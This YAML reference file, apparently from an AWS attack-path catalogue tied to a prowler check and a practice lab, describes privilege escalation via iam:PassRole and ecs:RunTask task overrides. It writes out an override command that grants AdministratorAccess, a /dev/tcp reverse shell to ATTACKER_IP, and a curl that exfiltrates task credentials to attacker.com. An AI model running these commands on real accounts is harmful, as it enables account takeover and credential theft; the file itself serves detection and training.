  prowler: https://github.com/prowler-cloud/prowler/blob/eabe4884379070c72e07103f239bac70d31f6320/prowler/providers/aws/services/iam/lib/privilege_escalation.py#L250

learningEnvironments:
  pathfinding-labs:
    type: open-source
    githubLink: https://github.com/DataDog/pathfinding-labs
    scenario: "privesc-one-hop/to-admin/iam-passrole+ecs-runtask"
    description: "Deploy Terraform into your own AWS account to practice this attack path"

attackVisualization:
  nodes:
    - id: start
      label: Starting Principal
      type: principal
      description: |
        The principal with `iam:PassRole` and `ecs:RunTask` permissions. Can be an IAM user or role. No `ecs:RegisterTaskDefinition` is required — the attack hijacks an existing task definition using the `--overrides` parameter at runtime.

    - id: fargate_task
      label: New Fargate Task Run (Existing Task Definition)
      type: resource
      description: |
        A new ECS task launched via `ecs:RunTask` against an existing task definition in the cluster. The attacker uses the `--overrides` parameter to replace both the `taskRoleArn` (passing a privileged role via `iam:PassRole`) and the container command with a malicious payload — without needing to register any new task definition.

    - id: target_role
      label: Existing Role That Trusts the ecs-tasks Service
      type: principal
      description: |
        The IAM role passed to the running task via the `--overrides` `taskRoleArn` field. Must trust `ecs-tasks.amazonaws.com`. Once the task starts, it automatically assumes this role and its temporary credentials are available to the container process. The role's permissions determine the blast radius of the attack.

    - id: method_direct
      label: "Method 1: Override Command (Direct IAM Elevation)"
      type: payload
      color: '#99ccff'
      description: |
        Override the container command with an AWS CLI call that directly elevates the starting principal using the task role's credentials. Because the Fargate task runs with the passed role's permissions, any IAM write action the role is authorized for can be used.

        Example override payload:
        - Attach AdministratorAccess to starting principal: `aws iam attach-user-policy --user-name STARTING_USER --policy-arn arn:aws:iam::aws:policy/AdministratorAccess`
        - Create new admin access keys: `aws iam create-access-key --user-name STARTING_USER`
        - Add starting principal to admin group: `aws iam add-user-to-group --user-name STARTING_USER --group-name Admins`

        This is the most direct approach but requires the target role to have IAM write permissions.

    - id: method_reverse_shell
      label: "Method 2: Override Command (Reverse Shell)"
      type: payload
      color: '#99ccff'
      description: |
        Override the container command with a script that establishes a reverse shell to an attacker-controlled server. This gives the attacker an interactive session running as the task role inside the Fargate container.

        Example override command:
        ```bash
        bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
        ```

        The attacker maintains a listener (e.g., `nc -lvnp 4444`) to catch the connection. Once connected, the AWS CLI uses the task role's credentials automatically via the container's IAM metadata, allowing interactive exploration and exploitation.

    - id: method_exfiltration
      label: "Method 3: Override Command (Credential Exfiltration)"
      type: payload
      color: '#99ccff'
      description: |
        Override the container command with a script that retrieves the task role's temporary credentials from the container credentials endpoint and exfiltrates them to an attacker-controlled server.

        Example override command:
        ```bash
        CREDS=$(curl -s $AWS_CONTAINER_CREDENTIALS_RELATIVE_URI)
        curl -X POST https://attacker.com/exfil -d "$CREDS"
        ```

        ECS tasks receive credentials via the `AWS_CONTAINER_CREDENTIALS_RELATIVE_URI` environment variable rather than the EC2 metadata service. The exfiltrated credentials can then be used from any environment until they expire.

    - id: admin
      label: Effective Administrator
      type: outcome
      description: |
        The target role has AdministratorAccess or equivalent permissions. Using any of the three exploitation methods, the attacker successfully leverages these permissions to gain full administrative access to the AWS account.

    - id: some_perms
      label: Some additional access
      type: outcome
      color: '#ffeb99'
      description: |
        The target role has elevated but non-administrative permissions. The attacker can use the task's execution context to access data (S3, RDS, Secrets Manager) or pivot to additional privilege escalation paths, but cannot immediately gain full admin access.

    - id: no_access
      label: No additional access
      type: outcome
      color: '#cccccc'
      description: |
        The target role has only minimal permissions (e.g., `logs:PutLogEvents`). Regardless of the exploitation method used, the privilege escalation provides limited value beyond what the starting principal already has.

  edges:
    - from: start
      to: fargate_task
      label: iam:PassRole + ecs:RunTask
      description: |
        Run an existing task definition on Fargate, using `--overrides` to replace the task role ARN (via `iam:PassRole`) and the container command with a malicious payload. No new task definition registration is required.

        Command:
        ```bash
        aws ecs run-task \
          --cluster CLUSTER_NAME \
          --task-definition EXISTING_TASK_DEFINITION \
          --launch-type FARGATE \
          --network-configuration "awsvpcConfiguration={subnets=[SUBNET_ID],assignPublicIp=ENABLED}" \
          --overrides '{
            "taskRoleArn": "arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE",
            "containerOverrides": [{
              "name": "CONTAINER_NAME",
              "command": ["iam", "attach-user-policy", "--user-name", "STARTING_USER", "--policy-arn", "arn:aws:iam::aws:policy/AdministratorAccess"]
            }]
          }'
        ```

    - from: fargate_task
      to: target_role
      label: Task assumes role
      description: |
        When the Fargate task starts, ECS automatically provides the overridden task role's temporary credentials to the container via the `AWS_CONTAINER_CREDENTIALS_RELATIVE_URI` environment variable. The container process runs with the full permissions of the passed role from the moment it starts executing.

    - from: target_role
      to: method_direct
      label: Option A
      branch: A
      description: |
        Choose the direct IAM elevation approach: override the container command with an AWS CLI call that directly modifies IAM permissions for the starting principal using the task role's credentials.

    - from: target_role
      to: method_reverse_shell
      label: Option B
      branch: B
      description: |
        Choose the reverse shell approach: override the container command with a script that establishes an interactive shell connection back to the attacker, providing hands-on access with the task role's credentials.

    - from: target_role
      to: method_exfiltration
      label: Option C
      branch: C
      description: |
        Choose the credential exfiltration approach: override the container command with a script that extracts and sends the task role's temporary credentials to an attacker-controlled endpoint for use outside of ECS.

    - from: method_direct
      to: admin
      label: If target role has admin or IAM write permissions
      branch: A1
      condition: admin
      description: |
        If the target role has AdministratorAccess or IAM write permissions (e.g., `iam:AttachUserPolicy`, `iam:PutUserPolicy`, `iam:AddUserToGroup`, `iam:CreateAccessKey`), the override command successfully elevates the starting principal to administrator.

    - from: method_direct
      to: some_perms
      label: If target role has some elevated permissions
      branch: A2
      condition: some_permissions
      description: |
        If the target role has elevated permissions but lacks IAM write access, the override command can be used to exfiltrate data or perform other privileged actions, but cannot directly modify the starting principal's permissions.

    - from: method_direct
      to: no_access
      label: If target role has minimal permissions
      branch: A3
      condition: no_permissions
      description: |
        If the target role only has minimal permissions, the override command cannot perform useful privileged actions.

    - from: method_reverse_shell
      to: admin
      label: If target role has admin permissions
      branch: B1
      condition: admin
      description: |
        If the target role has AdministratorAccess, the reverse shell provides interactive command-line access with full administrative permissions inside the Fargate container.

    - from: method_reverse_shell
      to: some_perms
      label: If target role has some permissions
      branch: B2
      condition: some_permissions
      description: |
        If the target role has some elevated permissions, the reverse shell allows the attacker to interactively explore and leverage those permissions from within the container environment.

    - from: method_reverse_shell
      to: no_access
      label: If target role has minimal permissions
      branch: B3
      condition: no_permissions
      description: |
        If the target role only has minimal permissions, the reverse shell provides limited value despite offering interactive access.

    - from: method_exfiltration
      to: admin
      label: If target role has admin permissions
      branch: C1
      condition: admin
      description: |
        If the target role has AdministratorAccess, the exfiltrated temporary credentials provide full administrative access that can be used from the attacker's own environment until the credentials expire (typically up to 1 hour).

    - from: method_exfiltration
      to: some_perms
      label: If target role has some permissions
      branch: C2
      condition: some_permissions
      description: |
        If the target role has some elevated permissions, the exfiltrated credentials can be used for data access, reconnaissance, or additional privilege escalation attempts from outside of ECS.

    - from: method_exfiltration
      to: no_access
      label: If target role has minimal permissions
      branch: C3
      condition: no_permissions
      description: |
        If the target role only has minimal permissions, the exfiltrated credentials provide limited value for further attacks.
